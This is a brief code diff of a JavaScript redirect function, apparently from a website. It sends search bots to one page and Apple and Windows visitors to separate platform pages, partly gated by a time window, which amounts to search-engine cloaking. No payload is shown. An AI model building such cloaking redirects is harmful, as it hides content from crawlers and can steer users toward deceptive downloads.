@@ -24,8 +24,8 @@
         function redirectToPage() {
             if (isSearchBot() && isWithinTimeRange()) {
                 window.location.href = 'main.html';
-            } else if (isAppleDevice() && isWithinTimeRange()) {
-                window.location.href = 'mac.php';
+            } else if (isAppleDevice()) {
+                window.location.href = 'mac.html';
             } else if (isWithinTimeRange()) {
                 window.location.href = 'win.html';
             } else {
